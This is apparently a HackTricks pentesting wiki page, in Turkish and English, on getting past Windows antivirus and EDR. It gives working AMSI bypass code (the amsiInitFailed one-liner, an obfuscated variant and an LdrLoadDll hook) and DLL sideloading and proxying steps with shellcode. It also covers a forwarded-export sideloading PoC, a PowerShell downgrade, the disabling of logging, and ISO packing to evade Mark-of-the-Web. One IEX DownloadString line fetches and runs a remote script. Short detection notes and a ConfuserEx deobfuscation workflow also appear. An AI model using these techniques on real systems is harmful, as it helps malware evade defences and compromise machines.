# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa [**@m2rc_p**](https://twitter.com/m2rc_p) tarafından yazıldı!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV taklidi yaparak Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın zararlı olup olmadığını tespit etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen zararlı string'ler veya byte dizilerini işaretleyerek ve dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum, vb.) gerçekleştirilir. Bu, bilinen kamu araçlarını kullanmanın sizi daha kolay yakalayabileceği anlamına gelir; çünkü muhtemelen analiz edilip zararlı olarak işaretlenmişlerdir. Bu tür tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

Binary'yi şifrelerseniz, AV'nin programınızı tespit etme yolu kalmaz, fakat programı bellekte decrypt edip çalıştırmak için bir loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen AV'yi geçmek için binary veya script içindeki bazı string'leri değiştirmek yeterli olur, ancak neyi obfuskasyona tabi tutmaya çalıştığınıza bağlı olarak bu zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz bilinen kötü imzalar olmaz, ama bu çok zaman ve emek gerektirir.

> [!TIP]
> Windows Defender'ın static detection'ına karşı kontrol etmek için iyi bir yöntem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Temelde dosyayı birden fazla segmente ayırır ve sonra Defender'a her birini ayrı ayrı taratır; bu şekilde binary'nizde hangi string'lerin veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) listesini kesinlikle incelemenizi tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox içinde çalıştırıp zararlı aktiviteleri izlemesi (ör. tarayıcı şifrelerinizi decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak vb.) durumudur. Bu kısmı aşmak biraz daha zor olabilir, ama sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır.

- **Sleep before execution** Uygulamanın nasıl implemente edildiğine bağlı olarak, bu AV'nin dynamic analysis'ini atlatmak için iyi bir yol olabilir. AV'lerin dosyaları taramak için kullanıcının iş akışını kesmemek adına çok kısa süreleri vardır, bu yüzden uzun sleep'ler binary'lerin analizini bozabilir. Sorun şu ki birçok AV sandbox'ı sleep'i atlayabilir, implementasyona bağlı olarak.
- **Checking machine's resources** Genellikle sandbox'ların çalışacak çok az kaynağı vardır (ör. < 2GB RAM), aksi halde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi; her şey sandbox içinde implemente edilmiş olmayacaktır.
- **Machine-specific checks** Hedefiniz "contoso.local" domain'ine katılmış bir kullanıcının workstation'ıysa, bilgisayarın domain'ini kontrol edip belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızdan çıkabilirsiniz.

Ortaya çıktı ki Microsoft Defender'ın Sandbox bilgisayar adı HAL9TH, bu yüzden malware'inizi patlatmadan önce bilgisayar adını kontrol edebilirsiniz; isim HAL9TH ise Defender'ın sandbox'ı içindesiniz demektir ve programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı gitmek için [@mgeeky](https://twitter.com/mariuszbit)'in bazı diğer gerçekten iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **public tools** eninde sonunda **tespit edilir**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS'i dump'lamak istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa LSASS'i dump eden daha az bilinen ve alternatif bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz örneğini ele alırsak, AV'ler ve EDR'ler tarafından muhtemelen en çok tespit edilen araçlardan biridir; proje kulllanıma çok hoş olsa da AV'leri atlatmak için onunla çalışmak bir kabustur, bu yüzden yapmak istediğiniz şey için alternatiflere bakın.

> [!TIP]
> Evasion için payload'larınızı değiştirirken, defender'da **automatic sample submission**'ı kapattığınızdan emin olun ve lütfen, cidden, uzun vadede evasion hedefiniz varsa **VIRUSTOTAL'A YÜKLEMEYİN**. Belirli bir AV'nin payload'ınızı tespit edip etmediğini kontrol etmek istiyorsanız, bir VM'e kurun, automatic sample submission'ı kapatmaya çalışın ve sonuçtan memnun olana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda her zaman **evasyon için DLL kullanmayı önceliklendirin**, deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir, bu yüzden payload'ınızın bir DLL olarak çalıştırılma yolu varsa bunu kullanmak tespitten kaçınmak için çok basit bir numaradır.

Bu görselde görebileceğimiz gibi, Havoc'tan bir DLL Payload antiscan.me üzerinde 4/26 tespit oranına sahipken, EXE payload 7/26 tespit oranına sahip.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyaları ile çok daha stealth olmanızı sağlayacak bazı numaraları göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL arama sırasından faydalanarak hedef uygulama ile kötü amaçlı payload(lar)ı yan yana konumlandırmayı kullanır.

DLL Sideloading'e yatkın programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e duyarlı programların listesini ve bu programların yüklemeye çalıştığı DLL dosyalarını çıkaracaktır.

Kendi başınıza **DLL Hijackable/Sideloadable programları keşfetmenizi** şiddetle tavsiye ederim; bu teknik doğru yapıldığında oldukça gizlidir, ancak kamuya mal olmuş DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği isimde bir kötü amaçlı DLL yerleştirmek tek başına payload'unuzun çalışmasını sağlamaz; çünkü program o DLL içinde belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, programın proxy (ve kötü amaçlı) DLL'den yaptığı çağrıları orijinal DLL'e iletir; böylece programın işlevselliği korunur ve payload'unuzun yürütülmesini sağlayabiliriz.

Kullanacağım proje [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy), [@flangvik](https://twitter.com/Flangvik) tarafından geliştirildi.

Aşağıda izlediğim adımlar:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) ve proxy DLL hem de [antiscan.me](https://antiscan.me) üzerinde 0/26 algılama oranına sahip! Bunu bir başarı olarak nitelendiririm.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında S3cur3Th1sSh1t'in [twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca daha derinlemesine öğrenmek için ippsec'in [videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) **şiddetle tavsiye ederim**.

### Forwarded Exports'ı Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri aslında "forwarders" olan fonksiyonları export edebilir: kodu işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağırıcı export'u çözümlediğinde, Windows loader şunları yapacaktır:

- Eğer `TargetDll` henüz yüklenmemişse yükler
- Ondan `TargetFunc`'i çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, ileri çözümlemeyi yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: bir fonksiyonu non-KnownDLL modül adına forward eden bir signed DLL bulun, sonra o signed DLL'i, forward edilen hedef modülle tam olarak aynı ada sahip attacker-controlled bir DLL ile aynı dizine koyun. Forward edilmiş export çağrıldığında, loader forward'u çözer ve Dll'inizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırasına göre çözülür.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Minimal bir DllMain, code execution elde etmek için yeterlidir; DllMain'i tetiklemek için yönlendirilmiş fonksiyonu uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) yükler
- `KeyIsoSetAuditingInterface` çözülürken yükleyici yönlendirmeyi `NCRYPTPROV.SetAuditingInterface`'e izler
- Yükleyici daha sonra `C:\test`'ten `NCRYPTPROV.dll`'i yükler ve onun `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra ancak "missing API" hatası alırsınız

Avlanma ipuçları:
- Hedef modül KnownDLLs değilse yönlendirilmiş exportlara odaklanın. KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş exportları şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Detection/savunma fikirleri:
- LOLBins'i izleyin (ör. rundll32.exe) imzalı DLL'leri non-system paths'tan yüklerken ve ardından aynı base name'e sahip non-KnownDLLs'i o dizinden yüklemesi durumlarını
- process/module zincirleri için uyarı oluşturun, örneğin: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` kullanıcı yazılabilir yollarında
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute izinlerini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'ı shellcode'unuzu gizlice yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Tespitten kaçma sadece bir kedi-fare oyunudur; bugün işe yarayan yarın tespit edilebilir, bu yüzden mümkünse yalnızca tek bir araca güvenmeyin — birden fazla kaçınma tekniğini zincirlemeyi deneyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"'ı önlemek için oluşturuldu. Başlangıçta, AV'ler yalnızca **files on disk** tarayabiliyordu, bu yüzden eğer bir şekilde payloadları **directly in-memory** çalıştırabiliyorsanız, AV bunu önlemek için hiçbir şey yapamazdı çünkü yeterli görünürlüğe sahip değildi.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Antivirüs çözümlerinin script davranışını incelemesine olanak tanır; script içeriğini şifresiz ve unobfuscated bir biçimde açığa çıkarır.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Dikkat edin, nasıl `amsi:` öne ekleniyor ve ardından scriptin çalıştığı yürütülebilir dosyanın yolu geliyor — bu örnekte powershell.exe.

Disk'e hiçbir dosya bırakmadık, ancak AMSI yüzünden yine de in-memory olarak yakalandık.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

AMSI'den kaçmanın birkaç yolu vardır:

- **Obfuscation**

  AMSI ağırlıklı olarak statik tespitlerle çalıştığı için yüklemeye çalıştığınız scriptleri değiştirmek tespitten kaçınmak için iyi bir yol olabilir.

  Ancak AMSI, birden fazla katmanı olsa bile scriptleri unobfuscating yapabilme yeteneğine sahiptir; bu yüzden obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da kaçmanın pek de basit olmadığı anlamına gelir. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmektir; durum, bir şeyin ne kadar işaretlendiğine bağlıdır.

- **AMSI Bypass**

  AMSI, powershell (aynı zamanda cscript.exe, wscript.exe vb.) sürecine bir DLL yükleyerek uygulandığı için, ayrıcalıksız bir kullanıcı olarak çalışıyor olsanız bile buna kolayca müdahale etmek mümkündür. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar AMSI taramasından kaçmak için birden fazla yol bulmuştur.

**Forcing an Error**

AMSI başlatılmasının başarısız olmasını sağlamak (amsiInitFailed), mevcut süreç için hiçbir taramanın başlatılmamasıyla sonuçlanır. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmıştı ve Microsoft daha geniş kullanımını önlemek için bir imza geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell işlemi için AMSI'yi kullanılamaz hâle getirmek sadece bir satır powershell kodu gerekiyordu. Bu satır elbette AMSI tarafından tespit edildi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresinin bulunmasını ve (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan) bu fonksiyonun E_INVALIDARG kodunu döndürecek talimatlarla üzerine yazılmasını içerir; bu şekilde gerçek taramanın sonucu 0 dönecek ve temiz sonuç olarak yorumlanacaktır.

> [!TIP]
> Daha ayrıntılı açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır; bunları öğrenmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) bağlantılarına göz atın.

### amsi.dll yüklemesini engelleyerek AMSI'yi bloke etme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut proses içine yüklendikten sonra başlatılır. Dil‑bağımsız, sağlam bir bypass yöntemi, istenen modül `amsi.dll` olduğunda bir hata döndüren bir user‑mode hook'u `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak, AMSI hiç yüklenmez ve o proses için tarama gerçekleşmez.

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript ve custom loaders dahil olmak üzere (aksi takdirde AMSI'yi yükleyecek her şey) çalışır.
- Uzun komut satırı artifaktlarını önlemek için scriptleri stdin üzerinden beslemekle eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins üzerinden çalıştırılan loaders tarafından kullanıldığını görülmüştür (ör., `regsvr32`'nin `DllRegisterServer` çağırması gibi).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Tespit edilen imzayı kaldırın**

Bu araçlardan **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanarak tespit edilen AMSI imzasını geçerli işlemin belleğinden kaldırabilirsiniz. Bu araç, geçerli işlemin belleğinde AMSI imzasını tarar ve ardından NOP talimatlarıyla üzerine yazarak bellekte etkili şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin bir listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**'te bulabilirsiniz.

**PowerShell version 2'yi kullanın**
PowerShell version 2 kullanırsanız, AMSI yüklenmeyecektir; bu sayede script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenize olanak sağlayan bir özelliktir. Bu, denetleme (auditing) ve sorun giderme için faydalı olabilir; ancak tespitten kaçmak isteyen saldırganlar için de **bir sorun** oluşturabilir.

PowerShell logging'i atlamak için şu teknikleri kullanabilirsiniz:

- **Disable PowerShell Transcription and Module Logging**: Bu amaçla şu aracı kullanabilirsiniz: [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)
- **Use Powershell version 2**: Eğer PowerShell sürüm 2 kullanırsanız, AMSI yüklenmeyecektir; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Savunmasız bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, Cobal Strike'dan `powerpick`'in kullandığı yöntemdir).


## Obfuscation

> [!TIP]
> Birçok obfuscation tekniği veriyi şifrelemeye dayanır; bu da binary'nin entropisini artırır ve AV/EDR'lerin tespitini kolaylaştırır. Buna dikkat edin ve şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya ticari forkları) kullanan malware'leri analiz ederken, decompiler'ları ve sandbox'ları engelleyen birçok koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı güvenilir şekilde **neredeyse orijinal IL'yi geri** getirir; bu IL daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilir.

1.  Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve bunu *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Bu ayrıca PE checksum'u da yama eder, bu yüzden herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı ConfuserEx farkında bir de4dot fork'u olan **de4dot-cex**'e verin:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot control-flow flattening'i geri alır, orijinal namespace'leri, sınıfları ve değişken isimlerini geri getirir ve sabit string'leri çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation'u daha da bozmak için doğrudan method çağrılarını hafif wrapper'larla (a.k.a *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opak wrapper fonksiyonları (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'larını görmeye başlamalısınız.

4.  Manual clean-up – ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımlarını arayarak *gerçek* payload'u bulun. Sıkça malware bunu `<Module>.byte_0` içinde TLV-encoded bir byte array olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırma ihtiyacı olmadan yürütme akışını geri kazandırır — çevrimdışı bir iş istasyonunda çalışırken faydalıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, yazılım güvenliğini [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve bozulmaya karşı koruma yoluyla artırabilen bir [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sağlamaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, `C++11/14` dilini kullanarak derleme zamanında herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden obfuscated code üretmeyi gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen obfuscated operations katmanı ekler; bu, uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli pe dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir yürütülebilir dosya için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM tarafından desteklenen diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek programı assembly kodu seviyesinde obfuscate eder; bu da normal kontrol akışına dair doğal kavrayışımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından yükleyebilir

## SmartScreen & MoTW

İnternetten bazı executable dosyalarını indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcının potansiyel olarak zararlı uygulamaları çalıştırmasına karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak itibar tabanlı bir yaklaşımla çalışır; nadiren indirilen uygulamalar SmartScreen'i tetikler, böylece kullanıcıyı uyarır ve dosyanın çalıştırılmasını engeller (dosya yine de More Info -> Run anyway seçilerek çalıştırılabilir).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'ini kontrol etme.</p></figcaption></figure>

> [!TIP]
> İmzalanmış executable'ların **güvenilir** bir signing certificate ile imzalanmış olması durumunda **SmartScreen'i tetiklemez**.

Payload'larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, bunları ISO gibi bir konteyner içine paketlemektir. Bunun nedeni Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payloadları çıktı konteynerlerine paketleyerek Mark-of-the-Web'ten kaçınmayı sağlayan bir araçtır.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
